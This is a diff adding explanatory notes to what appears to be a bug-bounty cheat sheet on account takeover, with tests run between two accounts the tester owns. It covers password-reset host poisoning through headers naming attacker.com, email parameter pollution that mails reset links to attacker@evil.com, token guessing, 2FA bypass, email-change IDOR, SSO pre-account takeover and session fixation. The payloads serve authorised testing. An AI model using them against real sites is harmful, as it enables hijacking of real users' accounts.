@@ -19,6 +19,8 @@ own** (attacker `A`, victim `B`); every proof ends "as `A`, I'm inside `B`." Res
 
 ## 1. Password-reset poisoning — host / link control (Guide §2)
 
+*What this does & when to use it:* forces the victim's reset **email** to point at **your** server, so their secret reset token lands with you when the link is followed (or server-fetched). Use it on the "forgot password" request — trigger the reset **for B**, add one of these headers/fields, and watch your listener for B's token. Each line is a different way to smuggle your host past validation (plain `Host`, the `X-Forwarded-*` variants, the `user@host` userinfo trick, CRLF dual-host); the `reset_url`/`callbackUrl` JSON fields are the easy version some APIs hand you. Try them one at a time.
+
 ```
 # poison the host the reset link is built from (trigger the reset FOR B, catch B's token):
 Host: attacker.com
@@ -37,6 +39,8 @@ Referer: https://target.com/reset?...             # if the reset page loads YOUR
 
 ## 2. Reset-flow email parameter abuse (Guide §5)
 
+*What this does & when to use it:* gets the victim's reset link **mailed to your inbox** by confusing which email address the server checks vs. which it sends to. Use it when §1's host tricks are blocked but the reset accepts an email you supply. The **HPP/array** lines send the address twice so the app validates B's but mails yours; the **CRLF** lines inject a second recipient (`cc`/`bcc`) via an encoded newline; the **normalization** line abuses an address that looks different to signup but resolves to B for delivery.
+
 ```
 # HPP / array — validated as B, mailed to attacker:
 email=victim@target.com&email=attacker@evil.com
@@ -54,6 +58,8 @@ Victim@target.com   victim@target.com.   victim+x@target.com   "victim"@target.c
 
 ## 3. Reset-token weakness checklist (Guide §4)
 
+*What this does & when to use it:* checks whether the reset token can be **guessed, forged, or replayed** instead of intercepted. Run it when you can't poison delivery but you *can* generate tokens for your own account — collect a batch, look for a pattern (a token that ticks up or tracks the clock lets you compute B's), and test the lifecycle failures (works twice? survives a password change? not tied to your user?). The "not bound to user" line is the money test: pair *your* valid token with *B's* id/email.
+
 ```
 □ collect N tokens for YOUR account (poc/reset_token_analyzer.py) -> sequential? timestamp? short? low-entropy? base64(userid+ts)?
 □ token still valid after use? after a 2nd reset request? after email/password change? -> replay
@@ -65,6 +71,8 @@ Victim@target.com   victim@target.com.   victim+x@target.com   "victim"@target.c
 ---
 
 ## 4. 2FA / OTP bypass (Guide §6–§8)
+
+*What this does & when to use it:* defeats the second factor. Reach for these once you have (or are testing) the password step. **Structural bypass** = walk around the 2FA check entirely (force-browse past it, flip a client-trusted boolean, use a login path that never asks). **OTP value tricks** = malformed inputs a sloppy check may accept as correct. **Rate-limit bypass** = the tweaks that make brute-forcing the code possible (reset the counter, spoof a new client, race). Prove the missing limit on **your own** account with a bounded batch — never crack a real user's code.
 
 ```
 # structural bypass:
@@ -85,6 +93,8 @@ leading-zero / negative / very-long code ; the LAST OTP still valid ; the same O
 
 ## 5. Email / phone change → ATO (Guide §9)
 
+*What this does & when to use it:* repoints the victim's account identity (email/phone) at **you**, so recovery and OTP delivery come to your inbox/device. Use it wherever an account-detail change is under-protected — no password re-check, no verification of the new address, or (the big one) a **user id you can swap** so you change *B's* details from *A* (IDOR), or extra fields the update blindly accepts (mass assignment). Follow any success with a password reset to complete the takeover.
+
 ```
 □ change email with NO current-password / NO OTP -> set B's email to mine, then reset
 □ new email active BEFORE verification ; no confirmation to the OLD email
@@ -95,6 +105,8 @@ leading-zero / negative / very-long code ; the LAST OTP still valid ; the same O
 
 ## 6. Pre-account-takeover & registration (Guide §10)
 
+*What this does & when to use it:* claims the victim's account **before they do** so their later login merges into yours. Use it on any site with SSO ("Sign in with Google") that doesn't strictly verify email ownership at signup — register B's email + your password now, wait for B's SSO login to fold into your account, and your password still works. The collision/overwrite lines are variants: register a normalized twin of an existing email, or an email the app links/overwrites instead of rejecting.
+
 ```
 1) register with the VICTIM's email (verification not enforced / skippable): {"email":"victim@corp.com","email_verified":true}
 2) victim later "Sign in with Google/SSO" -> app links/merges into MY pre-existing account (../OAuth/)
@@ -104,6 +116,8 @@ leading-zero / negative / very-long code ; the LAST OTP still valid ; the same O
 ```
 
 ## 7. Session / token (Guide §11)
+
+*What this does & when to use it:* attacks the "logged-in wristband." Use these against the cookie/token lifecycle. **Fixation** = plant a session id in B's browser and hope login doesn't swap it (then your copy is authenticated). The **survives-logout/password-change** line is the force-multiplier — it makes any stolen session permanent. The rest cover forgeable "remember me" keys, tokens leaking via the URL, and JWTs you can forge outright (→ JWT kit).
 
 ```
 □ SESSION FIXATION: set a known session id (cookie/URL) for B; B logs in; id NOT rotated -> shared authenticated session
@@ -129,6 +143,8 @@ leading-zero / negative / very-long code ; the LAST OTP still valid ; the same O
 ---
 
 ## 9. Triage rules (don't waste a report)
+
+*How to read this:* left of the `->` is what you achieved; right is the verdict. The pattern to internalize is the **last** line — anything that stops before "logged in as B" is a *lead*, not a finding, so finish the takeover before you file. Everything above it is a completed cross-account takeover, hence the Critical/High.
 
 ```
 poisoned host -> B's reset token caught at my server -> logged in as B          -> REPORT Critical (0-click ATO)
